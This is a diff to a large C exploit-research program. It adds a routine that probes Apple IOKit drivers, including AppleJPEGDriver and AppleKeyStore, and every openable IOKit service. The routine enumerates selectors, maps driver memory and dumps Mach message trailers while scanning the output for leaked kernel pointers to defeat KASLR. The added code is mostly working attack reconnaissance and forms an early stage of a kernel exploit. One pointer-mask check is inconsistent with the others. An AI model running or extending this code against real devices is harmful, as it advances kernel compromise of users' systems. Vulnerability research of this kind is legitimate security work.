@@ -16734,6 +16734,440 @@ static void r428_sighandler(int sig) {
  * surf pointer itself) for any kernel pointers or interesting data.
  */
 
+static void r431_probe(void) {
+    rlog("\n=== r431: Deep IOKit Driver Exploration ===\n");
+    rlog("  AppleJPEGDriver selectors, AppleKeyStore, AVE2 alt types, Metal\n\n");
+    fflush(stdout);
+
+    /* Vector A: AppleJPEGDriver — full selector + MapMemory scan */
+    rlog("  --- Vector A: AppleJPEGDriver deep probe ---\n");
+    {
+        io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+            IOServiceMatching("AppleJPEGDriver"));
+        io_connect_t conn = 0;
+        kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
+        rlog("    open: kr=%d conn=0x%x\n", kr, conn);
+
+        if (kr == 0 && conn) {
+            /* Test selectors 0-50 with scalar output */
+            rlog("    Scalar output selectors:\n");
+            for (int sel = 0; sel <= 50; sel++) {
+                uint64_t out[16] = {0};
+                uint32_t outcnt = 16;
+                kern_return_t kr2 = IOConnectCallMethod(conn, sel,
+                    NULL, 0, NULL, 0, out, &outcnt, NULL, NULL);
+                if (kr2 == 0 && outcnt > 0) {
+                    rlog("      sel %d: outcnt=%u", sel, outcnt);
+                    for (uint32_t j = 0; j < outcnt && j < 8; j++) {
+                        rlog(" [%u]=0x%llx", j, (unsigned long long)out[j]);
+                        if ((out[j] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL)
+                            rlog("***KPTR***");
+                    }
+                    rlog("\n");
+                }
+            }
+
+            /* Test selectors with struct output */
+            rlog("    Struct output selectors:\n");
+            for (int sel = 0; sel <= 50; sel++) {
+                uint8_t sbuf[4096] = {0};
+                size_t slen = sizeof(sbuf);
+                kern_return_t kr2 = IOConnectCallMethod(conn, sel,
+                    NULL, 0, NULL, 0, NULL, NULL, sbuf, &slen);
+                if (kr2 == 0 && slen > 0) {
+                    rlog("      sel %d: struct_len=%zu\n", sel, slen);
+                    uint64_t *qp = (uint64_t*)sbuf;
+                    for (size_t j = 0; j < slen / 8 && j < 64; j++) {
+                        if ((qp[j] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL)
+                            rlog("        *** KPTR +%zu: 0x%016llx ***\n",
+                                 j*8, (unsigned long long)qp[j]);
+                    }
+                    /* Show first few non-zero qwords */
+                    int shown = 0;
+                    for (size_t j = 0; j < slen / 8 && shown < 10; j++) {
+                        if (qp[j] != 0) {
+                            rlog("        +%zu: 0x%016llx\n", j*8, (unsigned long long)qp[j]);
+                            shown++;
+                        }
+                    }
+                }
+            }
+
+            /* Test selectors with scalar input */
+            rlog("    Scalar input + scalar output:\n");
+            for (int sel = 0; sel <= 20; sel++) {
+                uint64_t in_sc[4] = {0, 0, 0, 0};
+                uint64_t out[16] = {0};
+                uint32_t outcnt = 16;
+                kern_return_t kr2 = IOConnectCallMethod(conn, sel,
+                    in_sc, 1, NULL, 0, out, &outcnt, NULL, NULL);
+                if (kr2 == 0 && outcnt > 0) {
+                    rlog("      sel %d (1 scalar in): outcnt=%u", sel, outcnt);
+                    for (uint32_t j = 0; j < outcnt && j < 4; j++) {
+                        rlog(" [%u]=0x%llx", j, (unsigned long long)out[j]);
+                        if ((out[j] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL)
+                            rlog("***KPTR***");
+                    }
+                    rlog("\n");
+                }
+            }
+
+            /* MapMemory types 0-15 */
+            rlog("    MapMemory:\n");
+            for (uint32_t mt = 0; mt < 16; mt++) {
+                mach_vm_address_t maddr = 0;
+                mach_vm_size_t msz = 0;
+                kr = IOConnectMapMemory64(conn, mt, mach_task_self(),
+                    &maddr, &msz, kIOMapAnywhere);
+                if (kr == 0 && msz > 0) {
+                    rlog("      type %u: addr=0x%llx size=0x%llx\n",
+                         mt, (unsigned long long)maddr, (unsigned long long)msz);
+                    uint64_t *mp = (uint64_t*)maddr;
+                    size_t scan_sz = (msz > 0x10000) ? 0x10000 : (size_t)msz;
+                    int mkptr = 0, nonzero = 0;
+                    for (size_t j = 0; j < scan_sz / 8; j++) {
+                        if (mp[j] != 0) nonzero++;
+                        if ((mp[j] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                            rlog("        *** KPTR +%zu: 0x%016llx ***\n",
+                                 j*8, (unsigned long long)mp[j]);
+                            mkptr++;
+                            if (mkptr >= 20) break;
+                        }
+                    }
+                    rlog("        %d nonzero qwords, %d kptrs in first 0x%zx bytes\n",
+                         nonzero, mkptr, scan_sz);
+                    /* Show first 8 non-zero qwords */
+                    int shown = 0;
+                    for (size_t j = 0; j < scan_sz / 8 && shown < 8; j++) {
+                        if (mp[j] != 0) {
+                            rlog("        +%zu: 0x%016llx\n", j*8, (unsigned long long)mp[j]);
+                            shown++;
+                        }
+                    }
+                    IOConnectUnmapMemory64(conn, mt, mach_task_self(), maddr);
+                }
+            }
+
+            /* Registry properties */
+            CFMutableDictionaryRef props = NULL;
+            kr = IORegistryEntryCreateCFProperties(svc, &props,
+                kCFAllocatorDefault, 0);
+            if (kr == 0 && props) {
+                CFIndex cnt = CFDictionaryGetCount(props);
+                rlog("    Registry properties: %ld keys\n", (long)cnt);
+                /* Dump keys */
+                const void **keys = malloc(cnt * sizeof(void*));
+                const void **vals = malloc(cnt * sizeof(void*));
+                CFDictionaryGetKeysAndValues(props, keys, vals);
+                for (CFIndex i = 0; i < cnt && i < 20; i++) {
+                    char kbuf[128] = {0};
+                    CFStringGetCString(keys[i], kbuf, sizeof(kbuf), kCFStringEncodingUTF8);
+                    CFTypeID tid = CFGetTypeID(vals[i]);
+                    if (tid == CFDataGetTypeID()) {
+                        CFDataRef d = vals[i];
+                        CFIndex dlen = CFDataGetLength(d);
+                        rlog("      '%s': data(%ld bytes)\n", kbuf, (long)dlen);
+                        if (dlen >= 8 && dlen <= 256) {
+                            const uint64_t *dp = (const uint64_t*)CFDataGetBytePtr(d);
+                            for (CFIndex j = 0; j < dlen / 8; j++) {
+                                if ((dp[j] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                                    rlog("        *** KPTR +%ld: 0x%016llx ***\n",
+                                         (long)(j*8), (unsigned long long)dp[j]);
+                                }
+                            }
+                        }
+                    } else if (tid == CFNumberGetTypeID()) {
+                        int64_t nv = 0;
+                        CFNumberGetValue(vals[i], kCFNumberSInt64Type, &nv);
+                        rlog("      '%s': %lld (0x%llx)\n", kbuf, (long long)nv, (unsigned long long)nv);
+                    } else if (tid == CFStringGetTypeID()) {
+                        char sbuf[256] = {0};
+                        CFStringGetCString(vals[i], sbuf, sizeof(sbuf), kCFStringEncodingUTF8);
+                        rlog("      '%s': \"%s\"\n", kbuf, sbuf);
+                    } else {
+                        rlog("      '%s': type=%lu\n", kbuf, (unsigned long)tid);
+                    }
+                }
+                free(keys);
+                free(vals);
+                CFRelease(props);
+            }
+
+            IOServiceClose(conn);
+        }
+        if (svc) IOObjectRelease(svc);
+    }
+    fflush(stdout);
+
+    /* Vector B: AppleKeyStore — selector enumeration */
+    rlog("\n  --- Vector B: AppleKeyStore deep probe ---\n");
+    {
+        io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+            IOServiceMatching("AppleKeyStore"));
+        io_connect_t conn = 0;
+        kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
+        rlog("    open: kr=%d conn=0x%x\n", kr, conn);
+
+        if (kr == 0 && conn) {
+            /* Test selectors 0-100 with scalar output */
+            rlog("    Scalar output selectors 0-100:\n");
+            for (int sel = 0; sel <= 100; sel++) {
+                uint64_t out[16] = {0};
+                uint32_t outcnt = 16;
+                kern_return_t kr2 = IOConnectCallMethod(conn, sel,
+                    NULL, 0, NULL, 0, out, &outcnt, NULL, NULL);
+                if (kr2 == 0 && outcnt > 0) {
+                    rlog("      sel %d: outcnt=%u", sel, outcnt);
+                    for (uint32_t j = 0; j < outcnt && j < 4; j++) {
+                        rlog(" [%u]=0x%llx", j, (unsigned long long)out[j]);
+                        if ((out[j] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL)
+                            rlog("***KPTR***");
+                    }
+                    rlog("\n");
+                }
+            }
+
+            /* Struct output */
+            rlog("    Struct output selectors 0-50:\n");
+            for (int sel = 0; sel <= 50; sel++) {
+                uint8_t sbuf[4096] = {0};
+                size_t slen = sizeof(sbuf);
+                kern_return_t kr2 = IOConnectCallMethod(conn, sel,
+                    NULL, 0, NULL, 0, NULL, NULL, sbuf, &slen);
+                if (kr2 == 0 && slen > 0) {
+                    rlog("      sel %d: struct_len=%zu\n", sel, slen);
+                    uint64_t *qp = (uint64_t*)sbuf;
+                    for (size_t j = 0; j < slen / 8 && j < 64; j++) {
+                        if ((qp[j] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL)
+                            rlog("        *** KPTR +%zu: 0x%016llx ***\n",
+                                 j*8, (unsigned long long)qp[j]);
+                    }
+                    int shown = 0;
+                    for (size_t j = 0; j < slen / 8 && shown < 8; j++) {
+                        if (qp[j] != 0) {
+                            rlog("        +%zu: 0x%016llx\n", j*8, (unsigned long long)qp[j]);
+                            shown++;
+                        }
+                    }
+                }
+            }
+
+            /* MapMemory */
+            for (uint32_t mt = 0; mt < 8; mt++) {
+                mach_vm_address_t maddr = 0;
+                mach_vm_size_t msz = 0;
+                kr = IOConnectMapMemory64(conn, mt, mach_task_self(),
+                    &maddr, &msz, kIOMapAnywhere);
+                if (kr == 0 && msz > 0) {
+                    rlog("    MapMemory(%u): addr=0x%llx size=0x%llx\n",
+                         mt, (unsigned long long)maddr, (unsigned long long)msz);
+                    IOConnectUnmapMemory64(conn, mt, mach_task_self(), maddr);
+                }
+            }
+
+            IOServiceClose(conn);
+        }
+        if (svc) IOObjectRelease(svc);
+    }
+    fflush(stdout);
+
+    /* Vector C: AppleAVE2Driver — try user client types 1-10 */
+    rlog("\n  --- Vector C: AppleAVE2Driver alt user client types ---\n");
+    {
+        io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+            IOServiceMatching("AppleAVE2Driver"));
+        if (svc) {
+            for (uint32_t uctype = 0; uctype <= 10; uctype++) {
+                io_connect_t conn = 0;
+                kern_return_t kr = IOServiceOpen(svc, mach_task_self(), uctype, &conn);
+                if (kr == 0 && conn) {
+                    rlog("    type %u: OPEN! conn=0x%x\n", uctype, conn);
+                    /* Quick selector probe */
+                    for (int sel = 0; sel < 10; sel++) {
+                        uint64_t out[8] = {0};
+                        uint32_t outcnt = 8;
+                        kern_return_t kr2 = IOConnectCallMethod(conn, sel,
+                            NULL, 0, NULL, 0, out, &outcnt, NULL, NULL);
+                        if (kr2 == 0 && outcnt > 0) {
+                            rlog("      sel %d: out[0]=0x%llx\n", sel, (unsigned long long)out[0]);
+                            for (uint32_t j = 0; j < outcnt; j++) {
+                                if ((out[j] & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL)
+                                    rlog("        *** KPTR [%u]=0x%016llx ***\n",
+                                         j, (unsigned long long)out[j]);
+                            }
+                        }
+                    }
+                    /* MapMemory */
+                    for (uint32_t mt = 0; mt < 4; mt++) {
+                        mach_vm_address_t maddr = 0;
+                        mach_vm_size_t msz = 0;
+                        kr = IOConnectMapMemory64(conn, mt, mach_task_self(),
+                            &maddr, &msz, kIOMapAnywhere);
+                        if (kr == 0 && msz > 0) {
+                            rlog("      MapMemory(%u): 0x%llx sz=0x%llx\n",
+                                 mt, (unsigned long long)maddr, (unsigned long long)msz);
+                            uint64_t *mp = (uint64_t*)maddr;
+                            for (size_t j = 0; j < msz / 8 && j < 1024; j++) {
+                                if ((mp[j] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                                    rlog("        *** KPTR +%zu: 0x%016llx ***\n",
+                                         j*8, (unsigned long long)mp[j]);
+                                }
+                            }
+                            IOConnectUnmapMemory64(conn, mt, mach_task_self(), maddr);
+                        }
+                    }
+                    IOServiceClose(conn);
+                } else if (kr != -536870201 && kr != -536870211) {
+                    rlog("    type %u: kr=%d (0x%x)\n", uctype, kr, kr);
+                }
+            }
+            IOObjectRelease(svc);
+        } else {
+            rlog("    AppleAVE2Driver: not found\n");
+        }
+    }
+    fflush(stdout);
+
+    /* Vector D: Enumerate ALL accessible IOKit user clients */
+    rlog("\n  --- Vector D: IOKit iterator — find all openable services ---\n");
+    {
+        io_iterator_t iter = 0;
+        kern_return_t kr = IOServiceGetMatchingServices(kIOMasterPortDefault,
+            IOServiceMatching("IOService"), &iter);
+        rlog("    IOServiceGetMatchingServices: kr=%d\n", kr);
+
+        if (kr == 0) {
+            io_service_t svc;
+            int total = 0, opened = 0;
+            while ((svc = IOIteratorNext(iter)) != 0 && total < 500) {
+                total++;
+                io_connect_t conn = 0;
+                kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
+                if (kr == 0 && conn) {
+                    opened++;
+                    io_name_t name;
+                    IORegistryEntryGetName(svc, name);
+                    rlog("    OPENED: '%s' conn=0x%x\n", name, conn);
+
+                    /* Quick scan: selectors 0-5, MapMemory 0-3 */
+                    for (int sel = 0; sel < 6; sel++) {
+                        uint64_t out[8] = {0};
+                        uint32_t outcnt = 8;
+                        kern_return_t kr2 = IOConnectCallMethod(conn, sel,
+                            NULL, 0, NULL, 0, out, &outcnt, NULL, NULL);
+                        if (kr2 == 0 && outcnt > 0) {
+                            rlog("      sel %d: out[0]=0x%016llx cnt=%u\n",
+                                 sel, (unsigned long long)out[0], outcnt);
+                            for (uint32_t j = 0; j < outcnt; j++) {
+                                if ((out[j] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL)
+                                    rlog("        *** KPTR [%u]=0x%016llx ***\n",
+                                         j, (unsigned long long)out[j]);
+                            }
+                        }
+                    }
+                    for (uint32_t mt = 0; mt < 4; mt++) {
+                        mach_vm_address_t maddr = 0;
+                        mach_vm_size_t msz = 0;
+                        kr = IOConnectMapMemory64(conn, mt, mach_task_self(),
+                            &maddr, &msz, kIOMapAnywhere);
+                        if (kr == 0 && msz > 0) {
+                            rlog("      Map(%u): 0x%llx sz=0x%llx\n",
+                                 mt, (unsigned long long)maddr, (unsigned long long)msz);
+                            uint64_t *mp = (uint64_t*)maddr;
+                            int mkptr = 0;
+                            size_t scan = (msz > 0x10000) ? 0x10000 : (size_t)msz;
+                            for (size_t j = 0; j < scan / 8; j++) {
+                                if ((mp[j] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                                    rlog("        *** KPTR +%zu: 0x%016llx ***\n",
+                                         j*8, (unsigned long long)mp[j]);
+                                    mkptr++;
+                                    if (mkptr >= 10) break;
+                                }
+                            }
+                            if (mkptr > 0) rlog("        TOTAL: %d kernel pointers!\n", mkptr);
+                            IOConnectUnmapMemory64(conn, mt, mach_task_self(), maddr);
+                        }
+                    }
+                    IOServiceClose(conn);
+                }
+                IOObjectRelease(svc);
+            }
+            IOObjectRelease(iter);
+            rlog("    Scanned %d services, opened %d\n", total, opened);
+        }
+    }
+    fflush(stdout);
+
+    /* Vector E: Mach message audit trailer */
+    rlog("\n  --- Vector E: Mach msg audit trailer ---\n");
+    {
+        mach_port_t port;
+        kern_return_t kr = mach_port_allocate(mach_task_self(),
+            MACH_PORT_RIGHT_RECEIVE, &port);
+        if (kr == 0) {
+            /* Insert send right */
+            mach_port_insert_right(mach_task_self(), port, port,
+                MACH_MSG_TYPE_MAKE_SEND);
+
+            /* Send a message to ourselves */
+            struct {
+                mach_msg_header_t hdr;
+                uint64_t payload;
+            } send_msg = {0};
+            send_msg.hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
+            send_msg.hdr.msgh_size = sizeof(send_msg);
+            send_msg.hdr.msgh_remote_port = port;
+            send_msg.hdr.msgh_local_port = MACH_PORT_NULL;
+            send_msg.hdr.msgh_id = 0x41414141;
+            send_msg.payload = 0xDEADBEEF;
+
+            kr = mach_msg(&send_msg.hdr, MACH_SEND_MSG, sizeof(send_msg),
+                0, MACH_PORT_NULL, 0, MACH_PORT_NULL);
+            rlog("    send: kr=%d\n", kr);
+
+            /* Receive with maximum trailer */
+            struct {
+                mach_msg_header_t hdr;
+                uint64_t payload;
+                uint8_t trailer[256];
+            } recv_msg = {0};
+
+            kr = mach_msg(&recv_msg.hdr, MACH_RCV_MSG |
+                MACH_RCV_TRAILER_TYPE(MACH_MSG_TRAILER_FORMAT_0) |
+                MACH_RCV_TRAILER_ELEMENTS(MACH_RCV_TRAILER_AUDIT),
+                0, sizeof(recv_msg), port, 1000, MACH_PORT_NULL);
+            rlog("    recv: kr=%d size=%u\n", kr, recv_msg.hdr.msgh_size);
+
+            if (kr == 0) {
+                /* Dump trailer area */
+                size_t hdr_payload_sz = sizeof(mach_msg_header_t) + 8;
+                uint8_t *trailer_start = (uint8_t*)&recv_msg + hdr_payload_sz;
+                size_t trailer_avail = sizeof(recv_msg) - hdr_payload_sz;
+                rlog("    Trailer dump (%zu bytes available):\n", trailer_avail);
+                uint64_t *tp = (uint64_t*)trailer_start;
+                int kptr_found = 0;
+                for (size_t i = 0; i < trailer_avail / 8 && i < 32; i++) {
+                    if (tp[i] != 0) {
+                        rlog("      +%zu: 0x%016llx", i*8, (unsigned long long)tp[i]);
+                        if ((tp[i] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                            rlog(" *** KPTR ***");
+                            kptr_found++;
+                        }
+                        rlog("\n");
+                    }
+                }
+                if (kptr_found == 0) rlog("    No kernel pointers in audit trailer\n");
+            }
+
+            mach_port_destroy(mach_task_self(), port);
+        }
+    }
+    fflush(stdout);
+
+    rlog("\n=== r431 complete ===\n");
+    fflush(stdout);
+}
+
 static void r430_probe(void) {
     rlog("\n=== r430: Alternative KASLR Vectors ===\n");
     rlog("  host_zone_info, sysctl scan, VT encode, exception state\n\n");
@@ -17158,7 +17592,7 @@ static void r430_probe(void) {
         /* Try mach_port_kobject on the host port */
         natural_t ktype = 0;
         mach_vm_address_t kaddr = 0;
-        kr = mach_port_kobject(mach_task_self(), mach_host_self(), &ktype, (mach_port_address_t*)&kaddr);
+        kr = mach_port_kobject(mach_task_self(), mach_host_self(), &ktype, (mach_vm_address_t*)&kaddr);
         rlog("    mach_port_kobject(host): kr=%d type=%u addr=0x%llx\n",
              kr, ktype, (unsigned long long)kaddr);
 
@@ -74229,6 +74663,13 @@ new_modes:
             rlog("*** r=251 complete ***\n");
             goto done;
         }
+        if (rounds == 434) {
+            rlog("*** rounds=434: Deep IOKit Driver Exploration ***\n");
+            rlog("  AppleJPEGDriver, AppleKeyStore, AVE2 alt types, IOKit iterator\n\n");
+            fflush(stdout);
+            r431_probe();
+            goto done;
+        }
         if (rounds == 433) {
             rlog("*** rounds=433: Alternative KASLR Vectors ***\n");
             rlog("  host_zone_info, sysctl, VT encode, exception state, IOKit drivers\n\n");
@@ -76852,7 +77293,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
